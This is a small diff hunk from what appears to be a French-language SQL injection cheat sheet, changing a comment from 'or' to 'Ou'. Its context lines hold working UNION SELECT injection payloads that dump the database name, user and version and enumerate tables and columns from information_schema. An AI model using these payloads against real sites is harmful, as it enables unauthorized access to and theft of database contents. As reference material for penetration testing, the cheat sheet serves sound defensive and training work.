@@ -2020,7 +2020,7 @@ http://<site>/report.php?id=-23' UNION SELECT 1, 2, COLUMN_NAME, 4, 5 FROM INFOR
 
 # Exemples
 %' UNION SELECT database(), user(), @@version, null, null -- -
-# or
+# Ou
 ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- -
 
 ```
